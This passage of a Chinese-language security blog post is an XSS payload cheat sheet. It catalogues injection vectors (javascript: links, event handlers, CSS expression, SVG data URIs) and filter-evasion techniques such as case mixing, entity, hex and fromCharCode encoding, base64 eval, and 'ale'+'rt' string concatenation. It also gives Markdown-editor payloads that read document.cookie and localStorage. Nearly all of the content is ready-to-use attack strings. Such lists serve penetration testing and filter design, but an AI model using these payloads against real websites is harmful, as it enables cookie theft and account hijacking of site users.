class="header-anchor" href="#利用HTML标签的属性值-伪协议">¶</a>利用HTML标签的属性值(伪协议)</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span>(IE6生效)</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot; javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="利用事件"><a class="header-anchor" href="#利用事件">¶</a>利用<a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">事件</a></h2><ul><li>windows事件: windows对象触发的事件</li><li>From事件: HTML表单内动作触发事件</li><li>Keyboard事件: 键盘按键</li><li>Mouse事件: 鼠标或类似用户触发的事件</li><li>Media事件: 多媒体触发的事件</li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;./smile.jpg&#x27;</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;click me&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;xss&#x27;)&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><h2 id="利用CSS"><a class="header-anchor" href="#利用CSS">¶</a>利用CSS</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 引入外部样式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./xss.css&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="keyword">@import</span> <span class="string">&#x27;javascript:alert(/xss/)&#x27;</span>;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 利用旧的css属性, expression执行js代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:expression(alert(/xss/))&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">style</span>=<span class="string">&quot;xss:expression(alert(/xss/));&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 利用background-image属性执行js代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;background-image:url(javascript:alert(&#x27;xss&#x27;))&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">  <span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(/xss/)&quot;</span>);&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 两个一起用 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="selector-tag">body</span> &#123;<span class="attribute">background-image</span>: <span class="built_in">expression</span>(<span class="built_in">alert</span>(<span class="string">&quot;xss&quot;</span>));&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- list-style-image允许使用图像url, 利用其执行js代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;list-style-image:url(javascript:alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="大小写"><a class="header-anchor" href="#大小写">¶</a>大小写</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">sRc</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;javaScript:alert(/xss/)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">sRC</span>=<span class="string">&quot;JaVasCript:alert(0);&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&quot;javascript:alert(0);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="引号"><a class="header-anchor" href="#引号">¶</a>引号</h2><p>HTML可以不用引号,js可以用反引号代替单双引号</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`)/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert</span>`<span class="attr">xss</span>`/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;javascript:alert(0);&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">javascript:alert(0);</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="空格"><a class="header-anchor" href="#空格">¶</a>空格</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;img/src=&#x27;#&#x27;/onerror=&#x27;alert(/xss/)&#x27; /&gt;</span><br><span class="line">&lt;img/src=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="Tab和回车"><a class="header-anchor" href="#Tab和回车">¶</a>Tab和回车</h2><p>添加Tab和回车绕过关键词检测</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">&quot;j</span></span></span><br><span class="line"><span class="string"><span class="tag">avascript:alert(/xss/)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="其他"><a class="header-anchor" href="#其他">¶</a>其他</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 构造不同的全角字符: --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;&#123;left:ｅｘｐｒｅｓｓｉｏｎ(alert(&#x27;xss&#x27;))&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 利用注释符--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;wid/**/th:expre/*xss*/ssion(alert(&#x27;xss&#x27;));&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- \和\0– --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">    <span class="keyword">@imp</span>\0ort <span class="string">&#x27;java\0scri\pt:alert(/xss/)&#x27;</span>;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"> </span></span><br><span class="line"><span class="language-css">    <span class="keyword">@imp</span>\ort <span class="string">&#x27;ja\0va\00sc\000ri\0000pt:alert(/xss/)&#x27;</span>;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- CSS关键字转码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;xss:\65xpression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;xss:\065xpression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;xss:\0065xpression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--&lt;img src=&quot;--&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">οnerrοr</span>=<span class="string">alert(1)//</span>&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&lt;/comment&gt;&lt;img src=x οnerrοr=alert(1)//&quot;</span>&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">“</span></span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)//”</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 构造JS脚本使标签闭合绕过get传来的参数 var $a = “&lt;?php echo $_GET[&quot;name&quot;]; ?&gt;”; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Eastmount&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">1&quot;;<span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">scr</span>=<span class="string">1</span> <span class="attr">οnerrοr</span>=<span class="string">alert(‘Eastmount’)</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="comment">&lt;!-- 绕过字符转义htmlentities($_GET[“name”]) --&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">’;alert(‘Eastmount’);&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">Eastmount’;alert($a);//</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"><span class="comment">&lt;!-- 利用$_SERVER[‘PHP_SELF’]绕过字符转义htmlentities()函数 --&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">/&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Eastmount&#x27;</span>)</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&quot;&lt; &quot;</span><br><span class="line">/&quot;&gt;<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">οnerrοr</span>=<span class="string">alert(</span>&#x27;<span class="attr">Eastmount</span>&#x27;)&gt;</span><span class="tag">&lt;<span class="name">form</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">&lt;!<span class="attr">--</span> <span class="attr">绕过URL锚点</span>(#)<span class="attr">连接</span> <span class="attr">--</span>&gt;</span></span><br><span class="line">http://localhost/xss/xss9.php#<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Eastmount&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="组合svg"><a class="header-anchor" href="#组合svg">¶</a>组合svg</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20onload%3D%22alert(1)%22%2F%3E&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="利用图像属性"><a class="header-anchor" href="#利用图像属性">¶</a>利用图像属性</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> </span></span><br><span class="line"><span class="tag">  <span class="attr">src</span>=<span class="string">&quot;valid.jpg&quot;</span> </span></span><br><span class="line"><span class="tag">  <span class="attr">onerror</span>=<span class="string">&quot;eval(atob(&#x27;YWxlcnQoJ1hTUycp&#x27;))&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">style</span>=<span class="string">&quot;display:none&quot;</span></span></span><br><span class="line"><span class="tag">&gt;</span> </span><br></pre></td></tr></table></figure><h2 id="多阶段攻击"><a class="header-anchor" href="#多阶段攻击">¶</a>多阶段攻击</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/uploads/1.gif&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;loadNext()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// 即使被CSP阻止也不影响</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">loadNext</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>();</span></span><br><span class="line"><span class="language-javascript">  img.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="title function_">stealData</span>() &#125;;</span></span><br><span class="line"><span class="language-javascript">  img.<span class="property">src</span> = <span class="string">&quot;/uploads/2.gif&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="关键词过滤绕过"><a class="header-anchor" href="#关键词过滤绕过">¶</a>关键词过滤绕过</h2><p>大小写绕过, 编码绕过, 更换关键词绕过</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(/xss/)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br><span class="line">&lt;sc<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ript&gt;<span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)&lt;/s</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>cript&gt;</span><br></pre></td></tr></table></figure><p>html实体编码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#x61;</span>script:alert(/xss/)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>url编码</p><p>ASCII编码</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 替换如下, t的ASCII码值为116，用”&amp;#116”表示, :则表示&amp;#58--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascrip&amp;#116&amp;#58alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 再进一步替换：--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascrip&amp;#000116&amp;#00058alert(&#x27;xss&#x27;);&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>十进制</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &lt;img src=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp; #108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#39&amp;#120&amp;#115&amp;#115&amp;#39&amp;#41&amp;#59&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>十六进制</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- &lt;img src=&quot;javascript:alert(&#x27;xss&#x27;);&quot;&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;# x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x78&amp;#x73&amp;#x73&amp;#x27&amp;#x29&amp;#x3b&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>字符编码<code>eval()</code>函数, <code>eval()</code>和<code>string.fromCharCode()</code>函数过滤</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="built_in">eval</span>(<span class="string">&quot;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一些过滤: <a href="https://blog.csdn.net/yy17111342926/article/details/145986308">有广告的文章</a></p><p>对于alert过滤: <a href="https://www.sqlsec.com/2019/11/vul1.html#XSS">记录一次某客户系统的漏洞挖掘</a></p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">prompt(1)</span>&gt;</span></span><br><span class="line">xsspayload<span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">confirm(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="字符串拼接-动态属性访问-替代函数"><a class="header-anchor" href="#字符串拼接-动态属性访问-替代函数">¶</a>字符串拼接 + 动态属性访问 + 替代函数</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">c=<span class="number">1</span>;top[<span class="string">&#x27;ale&#x27;</span>+<span class="string">&#x27;rt&#x27;</span>].<span class="title function_">call</span>(<span class="literal">null</span>,c)</span><br></pre></td></tr></table></figure><p>这个xss只需要更换外壳即可</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">\</span>&quot;<span class="attr">x</span>\&quot; <span class="attr">onerror</span>=<span class="string">\</span>&quot;<span class="attr">c</span>=<span class="string">&#x27;coo&#x27;</span>+&#x27;<span class="attr">kie</span>&#x27;;<span class="attr">top</span>[&#x27;<span class="attr">ale</span>&#x27;+&#x27;<span class="attr">rt</span>&#x27;]<span class="attr">.call</span>(<span class="attr">null</span>,<span class="attr">document</span>[<span class="attr">c</span>])\&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">c=<span class="number">1</span>;top[<span class="string">&#x27;ale&#x27;</span>+<span class="string">&#x27;rt&#x27;</span>].<span class="title function_">call</span>(<span class="literal">null</span>,c)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;c=1;top[&#x27;ale&#x27;+&#x27;rt&#x27;].call(null,c)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>解析如下:</p><ul><li><strong>top对象: </strong></li></ul><p>表示浏览器窗口层级中的最顶层窗口, 在 XSS 上下文中, 直接访问顶级窗口对象可绕过框架限制; 即使页面嵌入在 iframe 中,  <code>top</code> 也能访问主窗口的方法</p><ul><li><strong>动态属性访问</strong></li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">top[<span class="string">&#x27;ale&#x27;</span>+<span class="string">&#x27;rt&#x27;</span>]</span><br></pre></td></tr></table></figure><p>通过字符串拼接 <code>'ale' + 'rt'</code> 生成完整方法名 <code>'alert'</code>使用方括号语法访问对象属性，规避字符串过滤等价于 <code>top.alert</code>，但避免了直接出现 “alert” 完整字符串</p><ul><li><strong>函数调用</strong></li></ul><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">.<span class="title function_">call</span>(<span class="literal">null</span>, c)</span><br></pre></td></tr></table></figure><p><code>Function.prototype.call()</code> 是 JavaScript 核心方法:第一个参数 <code>null</code> 设置函数执行上下文（ <code>this</code> 值）, 第二个参数 <code>c</code> 作为实参传递给函数;最终执行效果等价于 <code>alert(c)</code> , 你想要弹出什么你就填进去, 或者给c赋值</p><p>首先规避了关键词的出现, 同时JavaScript允许通过字符串动态访问对象属性, 这个是无法被完全禁用的</p><h1>拓展</h1><h2 id="markdown编辑器"><a class="header-anchor" href="#markdown编辑器">¶</a>markdown编辑器</h2><blockquote><p>具体情境具体分析</p></blockquote><p><a href="https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/xss-in-markdown.html">HackTricks</a></p><p>插入超链接如下, 会被转成 HTML 代码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[click](https://www.baidu.com)</span><br><span class="line">=&gt;</span><br><span class="line">&lt;a href=&quot;https://www.baidu.com/&quot;&gt;Click Me&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>对于图片的 markdown 语法则如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">![a](http://example.com/1.png)</span><br><span class="line">=&gt;</span><br><span class="line">&lt;img src=&quot;http://example.com/1.png&quot; alt=&quot;a&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="伪协议-超链接"><a class="header-anchor" href="#伪协议-超链接">¶</a>伪协议-&gt;超链接</h3><p>在没有明显过滤的情况下直接插入 XSS 代码会被解析为超链接, 点击后弹窗</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:prompt(document.cookie)&quot;</span>&gt;</span>a<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 Markdown 语法进行插入</p><blockquote><p>小括号不能被解析, 于是用的反引号; XSS 编码绕过似乎也有说法</p></blockquote><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">[<span class="string">s</span>](<span class="link">javascript:alert`1`</span>)</span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:prompt(document.cookie</span>))</span><br><span class="line"></span><br><span class="line">&lt;!-- Other links attacks with some bypasses --&gt; </span><br><span class="line">[<span class="string">Basic</span>](<span class="link">javascript:alert(&#x27;Basic&#x27;</span>)) </span><br><span class="line">[<span class="string">Local Storage</span>](<span class="link">javascript:alert(JSON.stringify(localStorage</span>))) </span><br><span class="line">[<span class="string">CaseInsensitive</span>](<span class="link">JaVaScRiPt:alert(&#x27;CaseInsensitive&#x27;</span>)) </span><br><span class="line">[<span class="string">URL</span>](<span class="link">javascript://www.google.com%0Aalert(&#x27;URL&#x27;</span>)) </span><br><span class="line">[<span class="string">In Quotes</span>](<span class="link">&#x27;javascript:alert(&quot;InQuotes&quot;</span>)&#x27;) </span><br><span class="line">[<span class="string">a</span>](<span class="link">j a v a s c r i p t:prompt(document.cookie</span>))</span><br><span class="line">[<span class="string">a</span>](<span class="link">data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K</span>) </span><br><span class="line">[<span class="string">a</span>](<span class="link">javascript:window.onerror=alert;throw%201</span>)</span><br></pre></td></tr></table></figure><h3 id="插入图片"><a class="header-anchor" href="#插入图片">¶</a>插入图片</h3><p>同样是没有明显过滤的情况下, 直接插入 XSS 代码即可</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://example.com&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>符合 markdown 格式的:</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">![<span class="string">Uh oh</span>](<span class="link">&lt;&quot;onerror=&quot;alert(&#x27;XSS&#x27;</span>)&gt;)</span><br><span class="line">![<span class="string">Uh oh</span>](<span class="link">&lt;https://www.example.com/image.png&quot;onload=&quot;alert(&#x27;XSS&#x27;</span>)&gt;)</span><br><span class="line">![<span class="string">Escape SRC - onload</span>](<span class="link">&lt;https://www.example.com/image.png&quot;onload=&quot;alert(&#x27;ImageOnLoad&#x27;</span>)&gt;)</span><br><span class="line">![<span class="string">Escape SRC - onerror</span>](<span class="link">&lt;&quot;onerror=&quot;alert(&#x27;ImageOnError&#x27;</span>)&gt;)</span><br></pre></td></tr></table></figure><p>有的时候需要逃逸出src属性或者alt属性当中的双引号, 然后直接在后面接上 <code>onerror</code> 等属性即可构造 xss</p><p>理论没输过, 实战没成过</p><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">逃逸alt</span><br><span class="line">![<span class="string">12&quot; onerror=alert(1)</span>](<span class="link">https://example.com/1.png</span>)</span><br><span class="line"></span><br><span class="line">逃逸src:</span><br><span class="line">![<span class="string">12</span>](<span class="link">https://www.baidu.com/1.png&quot; onerror=alert(1</span>)//)</span><br></pre></td></tr></table></figure><h2 id="延长XSS生命周期"><a class="header-anchor" href="#延长XSS生命周期">¶</a>延长XSS生命周期</h2><p><a href="https://www.cnblogs.com/index-html/p/xss_long_live.html">【XSS】延长 XSS 生命期（已过时）</a></p><h2 